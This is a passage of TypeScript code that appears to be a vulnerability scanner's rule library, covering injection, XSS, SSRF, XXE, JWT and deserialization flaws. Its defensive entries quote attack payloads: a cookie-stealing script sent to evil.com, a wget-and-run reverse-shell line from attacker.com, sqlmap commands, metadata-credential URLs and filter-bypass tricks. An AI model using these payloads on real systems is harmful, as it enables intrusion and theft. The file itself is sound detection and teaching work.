import type { Rule } from "../types/rules";

export const ruleLibrary: Rule[] = [
  // ─── SQL Injection (generic: covers db.query with concat/template literals) ──
  {
    ruleId: "CF-001",
    name: "SQL Injection via String Concatenation",
    languageScope: ["javascript", "typescript", "python", "java", "php"],
    pattern:
      "(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE|DROP|UNION|ALTER|CREATE)(?:[^\\n]*(?:\\+\\s*\\w+|\\$\\{[^}]+\\}))|(?:db|connection|pool|mysql|client|knex)\\.(?:query|execute|run)\\s*\\(\\s*(?:['\"`][^'\"`,]*(?:\\+|\\$\\{)|[^'\"`\\n]*\\+\\s*\\w)",
    patternFlags: "i",
    owaspCategory: "A03:2021 – Injection",
    severity: "high",
    developerExplanation:
      "User-controlled input is directly concatenated into a SQL query string. This allows attackers to manipulate the query structure, bypass authentication, extract data, or destroy the database.",
    secureAlternative:
      'Use parameterized queries or prepared statements. Example: db.query("SELECT * FROM users WHERE id = ?", [userId], callback). Never concatenate user input into SQL strings.',
    suggestedFix:
      'db.query("SELECT * FROM users WHERE id = ?", [userId], (err, result) => {\n  if (err) { res.send("Error"); } else { res.json(result); }\n});',
    threatScenario:
      'An attacker submits "1 OR 1=1 --" as a user ID parameter, causing the query to return all rows and bypass authentication checks.',
    attackerPerspective:
      "SQL injection is one of the most exploitable vulnerabilities. Attackers probe input fields with payloads like ' OR '1'='1 to test for unsanitized concatenation.",
    exploitationReasoning:
      "By injecting SQL metacharacters (quotes, semicolons, comment sequences), an attacker can alter query logic, perform UNION-based data extraction, or execute stacked queries for RCE via xp_cmdshell on MSSQL.",
    impactAnalysis:
      "Full database compromise, authentication bypass, data exfiltration of PII/credentials, data destruction, and potential OS-level command execution depending on DB privileges.",
    bypassConsiderations:
      "WAF bypasses include case variation (SeLeCt), URL encoding, comment injection (/*!SELECT*/), and whitespace substitution with tabs or newlines.",
    manualVerificationChecklist: [
      "Confirm user input reaches the query without parameterization",
      "Test with single quote to check for SQL errors in response",
      "Try UNION SELECT NULL,NULL to probe column count",
      "Check if error messages reveal DB type or schema",
      "Verify whether blind injection is possible via time delays (SLEEP/WAITFOR)",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── SQL Injection (JS-specific: query variable built with + or template literal) ─
  {
    ruleId: "CF-001B",
    name: "SQL Injection via Query Variable Concatenation (JS/TS)",
    languageScope: ["javascript", "typescript"],
    pattern:
      "(?:const|let|var)\\s+\\w*[Qq]uery\\w*\\s*=\\s*(?:['\"`][^'\"`;]*(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)[^'\"`;]*(?:['\"`]\\s*\\+|\\$\\{)|`[^`]*(?:SELECT|INSERT|UPDATE|DELETE|FROM|WHERE)[^`]*\\$\\{)",
    patternFlags: "i",
    owaspCategory: "A03:2021 – Injection",
    severity: "high",
    developerExplanation:
      "A SQL query string is being built by concatenating user-controlled variables directly into the query. This is the classic SQL injection pattern — any variable appended with + or interpolated with ${} into a SQL string is a potential injection point.",
    secureAlternative:
      'Replace string concatenation with parameterized queries. Pass user input as a separate array argument: db.query("SELECT * FROM users WHERE id = ?", [userId], callback).',
    suggestedFix:
      'const query = "SELECT * FROM users WHERE id = ?";\ndb.query(query, [userId], (err, result) => {\n  if (err) { res.send("Error"); } else { res.json(result); }\n});',
    threatScenario:
      "An attacker sends ?id=1 OR 1=1-- as the query parameter. The concatenated query becomes SELECT * FROM users WHERE id = 1 OR 1=1--, returning all user records.",
    attackerPerspective:
      "String concatenation in SQL queries is trivially exploitable. Automated tools like sqlmap detect and exploit this in seconds with payloads like ' OR SLEEP(5)--.",
    exploitationReasoning:
      "The + operator or template literal ${} directly embeds attacker-controlled data into the SQL string. No encoding or escaping is applied, so SQL metacharacters alter the query structure.",
    impactAnalysis:
      "Authentication bypass, full table dumps, data modification, and potential remote code execution via database-specific features (xp_cmdshell, LOAD_FILE, INTO OUTFILE).",
    bypassConsiderations:
      "Even if the variable appears to be a number (req.query.id), it is a string in JavaScript. Type coercion does not prevent injection — always use parameterized queries.",
    manualVerificationChecklist: [
      "Submit ' (single quote) as the parameter and check for SQL errors",
      "Try 1 OR 1=1-- to check if all rows are returned",
      'Use sqlmap: sqlmap -u "http://target/user?id=1" --dbs',
      "Check if the DB user has elevated privileges (FILE, SUPER)",
      "Test for time-based blind injection: 1 AND SLEEP(5)--",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── XSS ─────────────────────────────────────────────────────────────────────
  {
    ruleId: "CF-002",
    name: "Reflected XSS via innerHTML / document.write",
    languageScope: ["javascript", "typescript"],
    pattern:
      "(innerHTML|outerHTML|document\\.write|document\\.writeln)\\s*[+]?=\\s*(?!['\"][^'\"]*['\"])",
    patternFlags: "i",
    owaspCategory: "A03:2021 – Injection",
    severity: "high",
    developerExplanation:
      "Assigning unsanitized data to innerHTML or using document.write with user-controlled content enables Cross-Site Scripting (XSS). Attackers can inject malicious scripts that execute in the victim's browser context.",
    secureAlternative:
      "Use textContent or innerText for plain text. For HTML, use a sanitization library like DOMPurify: element.innerHTML = DOMPurify.sanitize(userInput). Prefer DOM manipulation APIs over innerHTML.",
    suggestedFix:
      "// Safe: use textContent for plain text\nelement.textContent = userInput;\n\n// Or sanitize HTML with DOMPurify\nelement.innerHTML = DOMPurify.sanitize(userInput);",
    threatScenario:
      "A search page reflects the query parameter into the page via innerHTML. An attacker crafts a URL with ?q=<script>document.location='https://evil.com/?c='+document.cookie</script> and sends it to victims.",
    attackerPerspective:
      "XSS via innerHTML is a high-value target for session hijacking, credential theft, and malware distribution. Reflected XSS can be weaponized via phishing links.",
    exploitationReasoning:
      "If the value assigned to innerHTML contains <script> tags or event handlers like <img onerror=...>, the browser executes the injected code with full DOM access.",
    impactAnalysis:
      "Session cookie theft, account takeover, keylogging, phishing overlays, malware distribution, and defacement.",
    bypassConsiderations:
      "Script tag filtering can be bypassed with <img src=x onerror=alert(1)>, SVG payloads, or HTML entity encoding. CSP headers may mitigate but are often misconfigured.",
    manualVerificationChecklist: [
      "Identify all places where user input flows into innerHTML/document.write",
      "Test with <img src=x onerror=alert(document.domain)>",
      "Check if CSP headers are present and properly configured",
      "Verify if HttpOnly flag is set on session cookies",
      "Test for DOM-based XSS via URL fragment (#) manipulation",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Hardcoded Secrets ────────────────────────────────────────────────────────
  {
    ruleId: "CF-003",
    name: "Hardcoded API Key or Secret",
    languageScope: [
      "javascript",
      "typescript",
      "python",
      "java",
      "php",
      "go",
      "csharp",
    ],
    pattern:
      "(api[_-]?key|apikey|secret[_-]?key|access[_-]?token|auth[_-]?token|private[_-]?key|client[_-]?secret|password|passwd|pwd)\\s*[=:]\\s*['\"][A-Za-z0-9+/=_\\-]{8,}['\"]",
    patternFlags: "i",
    owaspCategory: "A02:2021 – Cryptographic Failures",
    severity: "high",
    developerExplanation:
      "Hardcoded credentials or API keys in source code are exposed to anyone with repository access. If the code is ever committed to a public repository, these secrets are permanently compromised.",
    secureAlternative:
      "Store secrets in environment variables or a secrets manager (e.g., AWS Secrets Manager, HashiCorp Vault). Access via process.env.API_KEY or equivalent. Add .env to .gitignore.",
    suggestedFix:
      '// In .env file:\n// API_KEY=your_actual_key_here\n\n// In code:\nconst apiKey = process.env.API_KEY;\nif (!apiKey) throw new Error("API_KEY environment variable is not set");',
    threatScenario:
      "A developer accidentally pushes code with a hardcoded AWS access key to a public GitHub repo. Automated scanners detect it within minutes and attackers spin up crypto-mining infrastructure.",
    attackerPerspective:
      "Automated tools like truffleHog, GitLeaks, and GitHub's secret scanning continuously monitor public repos for credential patterns. Hardcoded secrets are trivially exploitable.",
    exploitationReasoning:
      "Once extracted, API keys can be used to access cloud services, send emails, query databases, or impersonate the application. No further exploitation steps are needed.",
    impactAnalysis:
      "Unauthorized API access, financial charges from cloud resource abuse, data breach, service disruption, and reputational damage.",
    bypassConsiderations:
      "Rotating the key after exposure is necessary but insufficient if the key was already used. Check git history — even deleted files retain secrets in commit history.",
    manualVerificationChecklist: [
      'Search git history for the secret: git log -p | grep -i "api_key"',
      "Verify the secret is still active by testing it against the API",
      "Check if the secret has been rotated since the commit",
      "Confirm no other hardcoded secrets exist in the codebase",
      "Review CI/CD pipeline configuration for exposed secrets",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Command Injection ────────────────────────────────────────────────────────
  {
    ruleId: "CF-004",
    name: "OS Command Injection",
    languageScope: ["javascript", "typescript", "python", "php"],
    pattern:
      "(exec|execSync|spawn|system|shell_exec|passthru|popen|subprocess\\.call|subprocess\\.run|os\\.system|os\\.popen|child_process)\\s*\\(\\s*(?:[^)]*(?:\\+|\\$\\{|f['\"]|%s|format\\())",
    patternFlags: "i",
    owaspCategory: "A03:2021 – Injection",
    severity: "high",
    developerExplanation:
      "User-controlled input is passed to a shell execution function without sanitization. This allows attackers to inject arbitrary OS commands that execute with the application's privileges.",
    secureAlternative:
      "Avoid shell execution with user input entirely. If necessary, use parameterized APIs (e.g., spawn with argument arrays instead of shell strings). Validate and whitelist input strictly.",
    suggestedFix:
      "// Instead of: exec('convert ' + filename)\n// Use execFile with argument array (no shell interpolation):\nconst { execFile } = require('child_process');\nexecFile('convert', [filename], (err, stdout) => { ... });",
    threatScenario:
      'A file conversion endpoint accepts a filename parameter and passes it to exec("convert " + filename). An attacker submits "; cat /etc/passwd" to read system files.',
    attackerPerspective:
      "Command injection provides direct OS access. Attackers chain commands with ;, &&, ||, |, or subshells to execute arbitrary code, establish reverse shells, or exfiltrate data.",
    exploitationReasoning:
      'Shell metacharacters allow command chaining. A payload like "; wget http://attacker.com/shell.sh -O /tmp/s && bash /tmp/s" establishes a persistent backdoor.',
    impactAnalysis:
      "Full server compromise, data exfiltration, lateral movement within the network, ransomware deployment, and persistent backdoor installation.",
    bypassConsiderations:
      "Filters blocking semicolons can be bypassed with $() subshells, newlines (%0a), or IFS variable manipulation. Blind injection can be detected via time delays (sleep 5).",
    manualVerificationChecklist: [
      "Identify all exec/system/shell_exec calls with user-controlled parameters",
      'Test with "; id" or "| id" to check command execution',
      'Try time-based blind injection: "; sleep 5"',
      "Check application privileges (running as root?)",
      "Verify if outbound network connections are possible for reverse shell",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Path Traversal ───────────────────────────────────────────────────────────
  {
    ruleId: "CF-005",
    name: "Path Traversal via Unsanitized File Path",
    languageScope: ["javascript", "typescript", "python", "java", "php", "go"],
    pattern:
      "(readFile|readFileSync|open|fopen|file_get_contents|Files\\.read|ioutil\\.ReadFile|os\\.Open)\\s*\\(\\s*(?:[^)]*(?:\\+|\\$\\{|%s|format\\(|req\\.|request\\.|params\\.|query\\.))",
    patternFlags: "i",
    owaspCategory: "A01:2021 – Broken Access Control",
    severity: "high",
    developerExplanation:
      "User-controlled input is used to construct a file path without sanitization. Attackers can use ../ sequences to traverse outside the intended directory and read arbitrary files.",
    secureAlternative:
      'Resolve the path and verify it starts with the intended base directory: const resolved = path.resolve(baseDir, userInput); if (!resolved.startsWith(baseDir)) throw new Error("Invalid path");',
    suggestedFix:
      "const path = require('path');\nconst BASE_DIR = '/var/www/files';\nconst userFile = req.query.filename;\nconst resolved = path.resolve(BASE_DIR, userFile);\nif (!resolved.startsWith(BASE_DIR)) {\n  return res.status(400).send('Invalid path');\n}\nfs.readFile(resolved, ...);",
    threatScenario:
      'A file download endpoint accepts a filename parameter. An attacker requests "../../../../etc/passwd" to read the system password file.',
    attackerPerspective:
      "Path traversal is a reliable way to read sensitive files: /etc/passwd, .env, config.php, SSH private keys, or application source code.",
    exploitationReasoning:
      "By prepending ../ sequences, attackers escape the web root. URL encoding (%2e%2e%2f) or double encoding (%252e%252e%252f) can bypass naive filters.",
    impactAnalysis:
      "Disclosure of configuration files, credentials, private keys, source code, and system files. Can escalate to RCE if combined with log poisoning or file upload.",
    bypassConsiderations:
      "URL encode traversal sequences: %2e%2e/, ..%2f, %2e%2e%2f. Null byte injection (%00) may truncate extensions on older systems.",
    manualVerificationChecklist: [
      "Test with ../../../etc/passwd in file path parameters",
      "Try URL-encoded variants: %2e%2e%2f%2e%2e%2fetc%2fpasswd",
      "Check if the application resolves symlinks",
      "Verify base directory validation is implemented",
      "Test Windows paths: ..\\..\\.\\windows\\win.ini",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Insecure Random ─────────────────────────────────────────────────────────
  {
    ruleId: "CF-006",
    name: "Insecure Pseudo-Random Number Generator",
    languageScope: ["javascript", "typescript", "python", "java", "php"],
    pattern:
      "Math\\.random\\(\\)|random\\.random\\(\\)|rand\\(\\)|mt_rand\\(\\)|new Random\\(\\)(?!\\.nextBytes)",
    patternFlags: "i",
    owaspCategory: "A02:2021 – Cryptographic Failures",
    severity: "medium",
    developerExplanation:
      "Math.random() and similar PRNGs are not cryptographically secure. Their output is predictable, making them unsuitable for generating tokens, session IDs, passwords, or any security-sensitive values.",
    secureAlternative:
      "Use crypto.randomBytes() (Node.js), the secrets module (Python), SecureRandom (Java), or random_bytes() (PHP) for cryptographically secure random values.",
    suggestedFix:
      "const crypto = require('crypto');\n// Generate a secure 32-byte random token\nconst token = crypto.randomBytes(32).toString('hex');",
    threatScenario:
      "A password reset token is generated with Math.random(). An attacker who knows the approximate time of the request can predict the token and reset any user's password.",
    attackerPerspective:
      "PRNG state can be recovered from observed outputs. If tokens are generated with Math.random(), an attacker can predict future values after observing a few outputs.",
    exploitationReasoning:
      "V8's Math.random() uses xorshift128+, which is reversible. Tools like xorshift128plus-predictor can recover the internal state from 3 consecutive outputs.",
    impactAnalysis:
      "Predictable session tokens enable session hijacking. Predictable password reset tokens enable account takeover. Predictable CSRF tokens enable CSRF attacks.",
    bypassConsiderations:
      "Even with rate limiting, if the seed space is small enough, brute force is feasible. Time-based seeds (Date.now()) dramatically reduce the search space.",
    manualVerificationChecklist: [
      "Identify all uses of Math.random() in security-sensitive contexts",
      "Check if tokens are time-based or have small entropy",
      "Request multiple tokens and check for patterns",
      "Verify token length and character set entropy",
      "Test if tokens expire after use (single-use tokens)",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Open Redirect ────────────────────────────────────────────────────────────
  {
    ruleId: "CF-007",
    name: "Open Redirect via Unvalidated URL Parameter",
    languageScope: ["javascript", "typescript", "python", "java", "php"],
    pattern:
      "(res\\.redirect|header\\s*\\(\\s*['\"]Location|response\\.sendRedirect|HttpResponseRedirect|redirect\\s*\\()\\s*\\(?\\s*(?:req\\.|request\\.|\\$_GET|\\$_POST|\\$_REQUEST|params\\.|query\\.)",
    patternFlags: "i",
    owaspCategory: "A01:2021 – Broken Access Control",
    severity: "medium",
    developerExplanation:
      "The application redirects users to a URL derived from user-controlled input without validation. This enables phishing attacks where users are redirected to malicious sites after interacting with a trusted domain.",
    secureAlternative:
      "Maintain a whitelist of allowed redirect destinations. Validate that the redirect URL matches an allowed domain. Use relative paths instead of absolute URLs where possible.",
    suggestedFix:
      "const ALLOWED_HOSTS = ['app.example.com', 'www.example.com'];\nconst redirectUrl = new URL(req.query.next);\nif (!ALLOWED_HOSTS.includes(redirectUrl.hostname)) {\n  return res.status(400).send('Invalid redirect');\n}\nres.redirect(redirectUrl.toString());",
    threatScenario:
      "A login page redirects to ?next=https://evil.com after authentication. Users see the trusted domain in the initial URL and trust the redirect to the phishing site.",
    attackerPerspective:
      "Open redirects are valuable for phishing campaigns. The trusted domain in the initial URL lends credibility. Often used in OAuth flows to steal authorization codes.",
    exploitationReasoning:
      "Craft a URL like https://trusted.com/login?redirect=https://evil.com. After login, the user is silently redirected to the attacker's site, which may mimic the original.",
    impactAnalysis:
      "Phishing credential theft, OAuth token theft, malware distribution, and reputational damage to the trusted domain.",
    bypassConsiderations:
      "Whitelist bypasses: https://trusted.com.evil.com, https://evil.com?trusted.com, //evil.com (protocol-relative), https://trusted.com@evil.com.",
    manualVerificationChecklist: [
      "Test redirect with external URL: ?next=https://google.com",
      "Try protocol-relative URLs: ?next=//evil.com",
      "Test with URL containing trusted domain: ?next=https://evil.com?trusted.com",
      "Check if redirect is used in OAuth/SSO flows",
      "Verify whitelist validation is implemented server-side",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── SSRF ─────────────────────────────────────────────────────────────────────
  {
    ruleId: "CF-008",
    name: "Server-Side Request Forgery (SSRF)",
    languageScope: ["javascript", "typescript", "python", "java", "php"],
    pattern:
      "(fetch|axios|http\\.get|https\\.get|requests\\.get|requests\\.post|urllib\\.request|curl_exec|file_get_contents|HttpClient|WebClient)\\s*\\(?\\s*(?:[^)]*(?:req\\.|request\\.|params\\.|query\\.|body\\.|\\$_GET|\\$_POST))",
    patternFlags: "i",
    owaspCategory: "A10:2021 – Server-Side Request Forgery (SSRF)",
    severity: "high",
    developerExplanation:
      "The server makes HTTP requests to URLs derived from user input. Attackers can force the server to make requests to internal services, cloud metadata endpoints, or other restricted resources.",
    secureAlternative:
      "Validate and whitelist allowed URL schemes and domains. Block requests to private IP ranges (10.x.x.x, 172.16.x.x, 192.168.x.x, 169.254.x.x). Use a dedicated HTTP client with SSRF protections.",
    suggestedFix:
      "const ALLOWED_DOMAINS = ['api.trusted.com'];\nconst url = new URL(req.body.webhookUrl);\nif (!ALLOWED_DOMAINS.includes(url.hostname)) {\n  return res.status(400).json({ error: 'Domain not allowed' });\n}\nconst response = await fetch(url.toString());",
    threatScenario:
      "A webhook URL parameter is passed directly to a fetch call. An attacker submits http://169.254.169.254/latest/meta-data/iam/security-credentials/ to steal AWS IAM credentials.",
    attackerPerspective:
      "SSRF is critical in cloud environments. The AWS metadata endpoint at 169.254.169.254 exposes IAM credentials. Internal services often lack authentication assuming network-level protection.",
    exploitationReasoning:
      "By controlling the URL, attackers can probe internal network topology, access unauthenticated internal APIs, read cloud metadata, and potentially achieve RCE via internal services.",
    impactAnalysis:
      "Cloud credential theft (IAM roles), internal service enumeration, data exfiltration from internal APIs, and potential lateral movement to internal systems.",
    bypassConsiderations:
      "IP whitelist bypasses: DNS rebinding, decimal IP notation (2130706433 = 127.0.0.1), IPv6 (::1), URL redirects to internal IPs, and alternative schemes (file://, gopher://).",
    manualVerificationChecklist: [
      "Test with http://127.0.0.1 and http://localhost",
      "Try AWS metadata: http://169.254.169.254/latest/meta-data/",
      "Test internal IP ranges: http://10.0.0.1, http://192.168.1.1",
      "Check for DNS rebinding vulnerability",
      "Test alternative protocols: file://, gopher://, dict://",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Broken Authentication ────────────────────────────────────────────────────
  {
    ruleId: "CF-009",
    name: "JWT Verification Disabled (alg:none)",
    languageScope: ["javascript", "typescript", "python", "java"],
    pattern:
      "(jwt\\.verify|jwt\\.decode|verify\\s*\\()\\s*\\([^)]*(?:algorithms\\s*:\\s*\\[\\s*['\"]none['\"]|\\{\\s*algorithms\\s*:\\s*\\[|ignoreExpiration\\s*:\\s*true)",
    patternFlags: "i",
    owaspCategory: "A07:2021 – Identification and Authentication Failures",
    severity: "high",
    developerExplanation:
      'JWT tokens are being decoded without proper signature verification, or the "none" algorithm is accepted. This allows attackers to forge arbitrary tokens and impersonate any user.',
    secureAlternative:
      'Always verify JWT signatures with a strong algorithm (RS256 or HS256). Explicitly specify allowed algorithms: jwt.verify(token, secret, { algorithms: ["HS256"] }). Never accept the "none" algorithm.',
    suggestedFix:
      'const jwt = require("jsonwebtoken");\n// Always specify allowed algorithms explicitly\nconst decoded = jwt.verify(token, process.env.JWT_SECRET, {\n  algorithms: ["HS256"],\n  issuer: "your-app"\n});',
    threatScenario:
      'An attacker modifies a JWT header to set alg:"none" and removes the signature. If the server accepts unsigned tokens, the attacker can forge any claims and impersonate admin users.',
    attackerPerspective:
      'JWT algorithm confusion attacks are well-documented. Tools like jwt_tool automate the "none" algorithm attack and RS256-to-HS256 confusion attacks.',
    exploitationReasoning:
      'If the library accepts the "none" algorithm, an attacker can craft a token with arbitrary claims (e.g., {"role":"admin"}) and no signature. The server accepts it as valid.',
    impactAnalysis:
      "Complete authentication bypass, privilege escalation to admin, access to all user data, and potential full application compromise.",
    bypassConsiderations:
      "Also test RS256-to-HS256 confusion: sign a token with HS256 using the server's public key as the secret. Some libraries accept this if algorithm is not explicitly restricted.",
    manualVerificationChecklist: [
      'Decode the JWT and check the "alg" header field',
      'Test with alg:"none" and no signature',
      "Try RS256-to-HS256 confusion attack",
      "Check if expired tokens are rejected (exp claim)",
      "Verify the library version is not affected by known CVEs",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Insecure Deserialization ─────────────────────────────────────────────────
  {
    ruleId: "CF-010",
    name: "Insecure Deserialization",
    languageScope: ["javascript", "typescript", "python", "java", "php"],
    pattern:
      "(unserialize|pickle\\.loads|yaml\\.load\\s*\\([^)]*(?!Loader)|ObjectInputStream|readObject|node-serialize|serialize\\.unserialize)\\s*\\(",
    patternFlags: "i",
    owaspCategory: "A08:2021 – Software and Data Integrity Failures",
    severity: "high",
    developerExplanation:
      "Deserializing untrusted data can lead to remote code execution. Attackers craft malicious serialized payloads that execute arbitrary code when deserialized by the application.",
    secureAlternative:
      "Avoid deserializing untrusted data. Use safe formats like JSON.parse() for data exchange. If deserialization is required, implement integrity checks (HMAC) before deserializing.",
    suggestedFix:
      '// Instead of deserializing arbitrary objects, use JSON:\nconst data = JSON.parse(userInput);\n// Validate the structure with a schema validator:\nconst { error } = schema.validate(data);\nif (error) throw new Error("Invalid input");',
    threatScenario:
      "A PHP application deserializes user-supplied cookie data. An attacker crafts a serialized PHP object with a __destruct() method that executes system commands.",
    attackerPerspective:
      "Deserialization gadget chains are well-researched. Tools like ysoserial generate payloads for Java. PHP object injection via magic methods (__wakeup, __destruct) is common.",
    exploitationReasoning:
      "Serialized objects can contain references to classes with dangerous magic methods. When deserialized, these methods execute automatically, enabling RCE without any additional user interaction.",
    impactAnalysis:
      "Remote code execution, server compromise, data exfiltration, and complete application takeover.",
    bypassConsiderations:
      "HMAC validation can be bypassed if the key is weak or leaked. Type confusion attacks may bypass class whitelists. Test with ysoserial payloads for Java gadget chains.",
    manualVerificationChecklist: [
      "Identify all deserialization entry points (cookies, API parameters, file uploads)",
      "Test with ysoserial payloads for Java applications",
      "Check PHP applications for __wakeup and __destruct magic methods",
      "Verify HMAC or digital signature validation before deserialization",
      "Test with malformed serialized data to check error handling",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── XXE ─────────────────────────────────────────────────────────────────────
  {
    ruleId: "CF-011",
    name: "XML External Entity (XXE) Injection",
    languageScope: ["javascript", "typescript", "python", "java", "php"],
    pattern:
      "(DOMParser|parseString|xml\\.etree|SAXParser|DocumentBuilder|simplexml_load|libxml|XMLReader|parseXml)\\s*[.(]",
    patternFlags: "i",
    owaspCategory: "A03:2021 – Injection",
    severity: "high",
    developerExplanation:
      "XML parsers that process external entity references can be exploited to read local files, perform SSRF, or cause denial of service. If user-supplied XML is parsed without disabling external entities, XXE is possible.",
    secureAlternative:
      "Disable external entity processing: set FEATURE_EXTERNAL_GENERAL_ENTITIES to false. Use JSON instead of XML where possible. Validate and sanitize XML input before parsing.",
    suggestedFix:
      '// For Python lxml:\nfrom lxml import etree\nparser = etree.XMLParser(resolve_entities=False)\ntree = etree.parse(source, parser)\n\n// For Java SAXParser:\nfactory.setFeature(\n  "http://xml.org/sax/features/external-general-entities", false\n);',
    threatScenario:
      "An API endpoint accepts XML input. An attacker submits XML with an external entity declaration pointing to file:///etc/passwd, causing the server to return the file contents in the response.",
    attackerPerspective:
      "XXE is reliable for reading local files and performing SSRF. Blind XXE via out-of-band channels (DNS, HTTP) can exfiltrate data even when the response does not reflect the file content.",
    exploitationReasoning:
      'External entity declarations (<!ENTITY xxe SYSTEM "file:///etc/passwd">) instruct the parser to fetch and embed the file content. The result appears in the XML response.',
    impactAnalysis:
      "Local file disclosure (credentials, private keys, source code), SSRF to internal services, and denial of service via billion laughs attack.",
    bypassConsiderations:
      "If external entities are blocked, try parameter entities for blind XXE. XInclude attacks may work even when DOCTYPE is blocked. Test with UTF-16 encoded payloads.",
    manualVerificationChecklist: [
      'Test with a basic XXE payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
      "Try blind XXE with out-of-band DNS callback",
      "Check if the application accepts XML content-type",
      "Test XInclude attacks as an alternative to DOCTYPE",
      "Verify the XML parser version and known CVEs",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── Sensitive Data Exposure ──────────────────────────────────────────────────
  {
    ruleId: "CF-012",
    name: "Sensitive Data in Console Log",
    languageScope: ["javascript", "typescript"],
    pattern:
      "console\\.(log|info|debug|warn|error)\\s*\\([^)]*(?:password|token|secret|key|auth|credential|ssn|credit.?card|cvv|pin)[^)]*\\)",
    patternFlags: "i",
    owaspCategory: "A02:2021 – Cryptographic Failures",
    severity: "medium",
    developerExplanation:
      "Logging sensitive data (passwords, tokens, keys) to the console exposes it in log files, monitoring systems, and browser developer tools. This data can be accessed by unauthorized parties.",
    secureAlternative:
      "Never log sensitive values. Use structured logging with field redaction. Implement log scrubbing middleware that masks sensitive fields before writing to logs.",
    suggestedFix:
      '// Redact sensitive fields before logging\nconst safeLog = { ...userData, password: "[REDACTED]", token: "[REDACTED]" };\nconsole.log("User data:", safeLog);',
    threatScenario:
      "Debug logging left in production code logs JWT tokens. An attacker with access to log aggregation systems (Splunk, ELK) extracts valid tokens and hijacks user sessions.",
    attackerPerspective:
      "Log files are often accessible to more people than the application itself. Centralized logging systems, CI/CD pipelines, and monitoring tools may expose logged secrets.",
    exploitationReasoning:
      "Tokens and passwords logged in plaintext can be extracted from log files, monitoring dashboards, or error tracking services (Sentry, Datadog) by anyone with read access.",
    impactAnalysis:
      "Credential exposure, session hijacking, unauthorized API access, and compliance violations (PCI-DSS, HIPAA, GDPR).",
    bypassConsiderations:
      'Even if logs are "internal only," log injection attacks can manipulate log entries. Ensure log access is restricted and audited.',
    manualVerificationChecklist: [
      "Search codebase for console.log with sensitive variable names",
      "Check if debug logging is disabled in production",
      "Review log aggregation system access controls",
      "Verify sensitive fields are masked in all log outputs",
      "Check error handling code for accidental secret logging",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── NoSQL Injection ──────────────────────────────────────────────────────────
  {
    ruleId: "CF-013",
    name: "NoSQL Injection (MongoDB)",
    languageScope: ["javascript", "typescript"],
    pattern:
      "(?:find|findOne|findById|update|updateOne|deleteOne|aggregate|where)\\s*\\(\\s*(?:req\\.|request\\.|params\\.|query\\.|body\\.)",
    patternFlags: "i",
    owaspCategory: "A03:2021 – Injection",
    severity: "high",
    developerExplanation:
      "Passing user-controlled objects directly to MongoDB query methods enables NoSQL injection. Attackers can inject MongoDB operators ($gt, $where, $regex) to bypass authentication or extract data.",
    secureAlternative:
      "Validate and sanitize query parameters. Use explicit field extraction instead of spreading user objects: { username: req.body.username }. Use mongoose-sanitize or express-mongo-sanitize middleware.",
    suggestedFix:
      "// Vulnerable: User.findOne(req.body)\n// Safe: extract only expected fields\nconst { username, password } = req.body;\nif (typeof username !== 'string' || typeof password !== 'string') {\n  return res.status(400).send('Invalid input');\n}\nUser.findOne({ username, password });",
    threatScenario:
      'A login endpoint passes req.body directly to User.findOne(). An attacker sends {"username": {"$gt": ""}, "password": {"$gt": ""}} to bypass authentication and log in as the first user.',
    attackerPerspective:
      "NoSQL injection is underestimated. MongoDB operators like $where execute JavaScript server-side. $regex can be used for blind injection to enumerate data character by character.",
    exploitationReasoning:
      "MongoDB query operators are JSON objects. If user input is passed directly as a query filter, attackers can inject operators that alter query semantics without any special characters.",
    impactAnalysis:
      "Authentication bypass, data exfiltration, unauthorized data modification, and potential server-side JavaScript execution via $where operator.",
    bypassConsiderations:
      "Content-Type: application/json allows sending operator objects directly. URL parameters can also inject operators: ?username[$gt]=&password[$gt]=.",
    manualVerificationChecklist: [
      'Test login with {"username": {"$gt": ""}, "password": {"$gt": ""}}',
      "Try $regex injection for blind enumeration",
      "Check if express-mongo-sanitize middleware is installed",
      "Verify all query parameters are explicitly typed before use",
      "Test $where operator injection for JavaScript execution",
    ],
    modeVisibilityFlags: { developerMode: true, bugBountyMode: true },
  },

  // ─── NEW: Prototype Pollution ─────────────────────────────────────────────────
  {
    ruleId: "CF-014",
    name: "Prototype Pollution",
    languageScope: ["javascript", "typescript"],
    pattern:
      "(?:__proto__|constructor\\s*\\[|prototype\\s*\\[|Object\\.assign\\s*\\(\\s*(?:{}|Object\\.create\\(null\\))?\\s*,\\s*(?:req\\.|request\\.|params\\.|query\\.|body\\.)|merge\\s*\\(\\s*(?:{}|target)\\s*,\\s*(?:req\\.|request\\.|params\\.|query\\.|body\\.))",
    patternFlags: "i",
    owaspCategory: "A08:2021 – Software and Data Integrity Failures",
    severity: "high",
    developerExplanation:
      "Prototype pollution occurs when user-controlled keys like __proto__ or constructor.prototype are used to set properties on JavaScript object prototypes. This can corrupt the global object prototype and affect all objects in the application, potentially leading to remote code execution or privilege escalation.",
    secureAlternative:
      "Use Object.create(null) for dictionaries to avoid prototype chain. Sanitize user-supplied keys by blocking __proto__, constructor, and prototype. Use libraries like lodash >= 4.17.21 which have patched prototype pollution.",
    suggestedFix:
